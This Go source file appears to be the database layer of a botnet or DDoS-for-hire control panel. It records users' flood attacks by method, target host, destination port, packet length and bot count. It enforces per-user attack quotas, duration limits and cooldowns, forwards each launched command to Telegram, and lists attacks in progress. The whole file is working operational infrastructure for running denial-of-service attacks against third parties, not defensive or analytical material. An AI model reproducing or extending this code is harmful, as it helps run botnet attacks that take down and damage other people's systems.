package database

import (
	"database/sql"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"
)

type AttackOngoing struct {
	AttackID int
	UserID   int
	Duration int
	Command  string
	Attacked int64
	Method   string
	Target   string
	Dport    string
	Length   string
	Username string
}

func (db *Database) GetTotalAttacks(username string) (int, error) {
	var totalAttacks int

	err := db.db.QueryRow("SELECT `totalAttacks` FROM `users` WHERE `username` = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}

	return totalAttacks, nil
}

func (db *Database) IncreaseTotalAttacks(username string) error {
	_, err := db.db.Exec("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE username = ?", username)
	return err
}

func (db *Database) GetUserTotalAttacks(username string) (int, error) {
	var totalAttacks int
	err := db.db.QueryRow("SELECT totalAttacks FROM users WHERE username = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}
	return totalAttacks, nil
}

func (db *Database) GetMaxAttacks(username string) (int, error) {
	var maxAttacks int
	err := db.db.QueryRow("SELECT maxAttacks FROM users WHERE username = ?", username).Scan(&maxAttacks)
	if err != nil {
		return 0, err
	}
	return maxAttacks, nil
}

func (db *Database) GlobalRunning() int {
	var count int
	row := db.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE  `duration` + `time_sent` > strftime('%s', 'now')")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
		return 0
	}
	return count
}

func (db *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := db.db.Query("SELECT id, maxTime, cooldown, maxAttacks, totalAttacks FROM users WHERE username = ?", username)
	defer func(rows *sql.Rows) {
		err := rows.Close()
		if err != nil {
			fmt.Println(err)
		}
	}(rows)
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, cooldown, UserMaxAttacks, TotalAttacks uint32
	if !rows.Next() {
		return false, errors.New("your access has been terminated")
	}
	err = rows.Scan(&userId, &durationLimit, &cooldown, &UserMaxAttacks, &TotalAttacks)
	if err != nil {
		return false, err
	}

	if int(UserMaxAttacks) != 9999 && TotalAttacks >= UserMaxAttacks {
		return false, errors.New("max attacks reached. you cannot launch more attacks")
	}

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	err = rows.Close()
	if err != nil {
		return false, err
	}

	if allowConcurrent == 0 {
		rows, err = db.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > strftime('%s', 'now')", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			err := rows.Scan(&timeSent, &historyDuration)
			if err != nil {
				return false, err
			}
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}
	go func() { // lol
		LogtoTelegram(fullCommand, strconv.Itoa(int(duration)), int(userId))
	}()
	_, err = db.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, strftime('%s', 'now'), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	if err != nil {
		return false, err
	}
	return true, nil
}

func parseCommand(command string) (method, target, dport, length string) {
	parts := strings.Split(command, " ")

	if len(parts) < 3 {
		return "N/A", "N/A", "N/A", "N/A"
	}

	method = parts[0]
	target = parts[1]

	for _, part := range parts[2:] {
		if strings.HasPrefix(part, "dport=") {
			dport = strings.TrimPrefix(part, "dport=")
		} else if strings.HasPrefix(part, "len=") || strings.HasPrefix(part, "size=") {
			length = strings.TrimPrefix(part, "len=")
			length = strings.TrimPrefix(length, "size=")
		}
	}

	if dport == "" {
		dport = "N/A"
	}
	if length == "" {
		length = "N/A"
	}

	return method, target, dport, length
}

func (d *Database) GetOngoingAttacks() ([]map[string]string, error) {
	query := `
		SELECT users.username, history.time_sent, history.duration, history.command
		FROM history
		JOIN users ON history.user_id = users.id
		WHERE history.duration + history.time_sent > strftime('%s', 'now');
	`

	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []map[string]string

	for rows.Next() {
		var username, command string
		var timeSent, duration int

		if err := rows.Scan(&username, &timeSent, &duration, &command); err != nil {
			return nil, err
		}

		commandParts := strings.Fields(command)
		if len(commandParts) < 3 {
			continue
		}

		attack := make(map[string]string)
		attack["username"] = username
		attack["host"] = commandParts[1]

		if len(commandParts) > 3 && strings.HasPrefix(commandParts[3], "dport=") {
			attack["port"] = strings.TrimPrefix(commandParts[3], "dport=")
		}

		attack["duration"] = fmt.Sprintf("%d", duration)
		attack["floodType"] = strings.TrimPrefix(commandParts[0], "!")
		attack["time"] = time.Unix(int64(timeSent), 0).Format("Mon Jan 2 15:04:05 MST 2006")

		attacks = append(attacks, attack)
	}

	return attacks, nil
}
